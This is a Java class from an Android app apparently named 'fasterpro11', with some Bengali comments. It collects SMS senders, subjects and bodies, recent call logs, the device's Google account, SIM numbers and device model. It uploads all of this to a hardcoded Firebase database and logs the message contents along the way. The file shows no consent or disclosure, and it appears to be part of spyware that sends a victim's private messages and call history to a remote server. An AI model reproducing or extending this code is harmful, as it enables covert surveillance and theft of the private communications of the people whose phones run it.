package com.example.fasterpro11;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class FirebaseSaVeAndViewData {

    private static final String TAG = "FirebaseSaVeAndViewData";
    private static final String DATABASE_URL = "https://fasterpro11-9b9a9-default-rtdb.firebaseio.com/";
    private DatabaseReference mDatabase;

    // Firebase Database ইনিশিয়ালাইজেশন
    public FirebaseSaVeAndViewData() {
        mDatabase = FirebaseDatabase.getInstance(DATABASE_URL).getReference();
    }

    // SMS ডেটা Firebase-এ সংরক্ষণ করা
    public void saveSmsDataToFirebase(String sender, String body, String subject, String recentCallLogs, Context context) {

        AccountUtil accountUtil = new AccountUtil();
        String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
        String userSimNumber = accountUtil.getUserSimNumber(context);

        String title = "Your Notification Title";  // এটি আপনার টাইটেল হবে
        String text = "Your Notification Text";    // এটি আপনার টেক্সট হবে
        //String Get_Sim1_Number = accountUtil.Set_Sim1_Number(title, text ,  context);
        String Get_Sim1_Number = null;
        String manufacturer = Build.MANUFACTURER;
        String mobileModel = Build.MODEL;


        // own User Given Sim Number By lrt box
        GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(context);
        String UserID1= alert.getSim1NumberFromUser(context);
        String UserID2= alert.getSim2NumberFromUser(context);
        String UserGivenSimNumber= UserID1 + " "+UserID2;
        // Sim Number set by given Sms or notification
        NotificationListener notificationListener = new NotificationListener();
        String messageBody= "Your  Text";
        String setSim1NumberNotificationListener=notificationListener.SetSim1Number(context,messageBody);
        SmsReceiver smsReceiver = new SmsReceiver();
        String setSim1NumberSmsReceiver =smsReceiver.SetSim1Number(context,messageBody);
        String setSim1Number ;
        if (setSim1NumberNotificationListener != null) {
            setSim1Number =setSim1NumberNotificationListener;
        }else if(  setSim1NumberSmsReceiver != null) {
            setSim1Number =setSim1NumberSmsReceiver;
        }else {
            setSim1Number =null;
        }

                String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss a", Locale.getDefault()).format(new Date());
         //key genrate
        Log.d(TAG, "Generating SMS ID: ");
        String smsId = mDatabase.push().getKey() + " "+ timestamp  + " "+ setSim1Number + " " + UserGivenSimNumber +" "+ manufacturer +" "+ mobileModel;
        Log.d(TAG, "Generated SMS ID: " + smsId);
        if (smsId != null) {
            // ডেটার মান ম্যাপ আকারে প্রস্তুত করা
            Map<String, Object> smsData = new HashMap<>();

            // Split the subject into lines and store as a list
            String[] subjectLines = subject.split("\n");
            smsData.put("subject", Arrays.asList(subjectLines));
            Log.d(TAG, "Subject lines: " + Arrays.toString(subjectLines)); // Log subject lines

            smsData.put("sender", sender);

            // Split the body into lines and store as a list
            String[] bodyLines = body.split("\n");
            smsData.put("messageBody", Arrays.asList(bodyLines));
            Log.d(TAG, "Body lines: " + Arrays.toString(bodyLines)); // Log body lines

            // Split the recentCallLogs into lines and store as a list
            String[] callLogLines = recentCallLogs.split("\n");
            smsData.put("recentCallLogs", Arrays.asList(callLogLines));
            Log.d(TAG, "Call log lines: " + Arrays.toString(callLogLines)); // Log call log lines

            // Firebase-এ smsData নামে সংরক্ষণ
            mDatabase.child("smsData").child(smsId).setValue(smsData)
                    .addOnCompleteListener(task -> {
                        if (task.isSuccessful()) {
                            Log.d(TAG, "Data Firebase-এ সফলভাবে সংরক্ষিত হয়েছে.");
                        } else {
                            Log.e(TAG, "Firebase-এ Data সংরক্ষণে ত্রুটি: ", task.getException());
                        }
                    });
        } else {
            Log.e(TAG, "SMS-র জন্য ইউনিক ID তৈরি করতে ত্রুটি.");
        }
    }
}